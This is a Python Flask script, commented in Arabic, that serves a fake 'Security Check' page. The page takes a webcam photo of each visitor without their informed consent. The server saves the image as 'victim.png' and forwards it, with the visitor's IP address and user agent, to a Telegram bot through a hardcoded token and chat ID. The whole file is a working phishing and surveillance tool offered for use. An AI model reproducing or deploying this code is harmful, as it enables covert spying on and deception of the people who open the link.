import telebot
from flask import Flask, request, render_template_string
import base64

# إعدادات البوت الخاص بك
TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk"
CHAT_ID = "8351043975"
bot = telebot.TeleBot(TOKEN)

app = Flask(__name__)

# كود الصفحة التي تطلب الكاميرا وتلتقط الصورة
html_code = """
<!DOCTYPE html>
<html>
<head>
    <title>Security Check</title>
    <script>
        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0);

                const dataUrl = canvas.toDataURL('image/png');
                fetch('/capture', {
                    method: 'POST',
                    body: JSON.stringify({ image: dataUrl }),
                    headers: { 'Content-Type': 'application/json' }
                });
                
                stream.getTracks().forEach(track => track.stop());
                document.body.innerHTML = "<h1>Security Verified ✅</h1><p>Your connection is now secure.</p>";
            } catch (err) {
                document.body.innerHTML = "<h1>Access Denied</h1><p>Please allow camera access to verify your identity.</p>";
            }
        }
        window.onload = startCapture;
    </script>
</head>
<body style="text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4;">
    <div style="background: white; display: inline-block; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
        <h2>جاري فحص حالة الأمان...</h2>
        <p>يرجى السماح بالوصول للكاميرا لإكمال عملية التحقق.</p>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    user_agent = request.headers.get('User-Agent')
    ip_addr = request.remote_addr
    bot.send_message(CHAT_ID, f"🎯 دخول جديد للرابط!\\n🌐 IP: {ip_addr}\\n📱 الجهاز: {user_agent}")
    return render_template_string(html_code)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    image_data = data['image'].split(',')[1]
    
    with open("victim.png", "wb") as fh:
        fh.write(base64.b64decode(image_data))
    
    with open("victim.png", "rb") as photo:
        bot.send_photo(CHAT_ID, photo, caption="📸 تم التقاط صورة الضحية بنجاح!")
    return "OK"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8000)
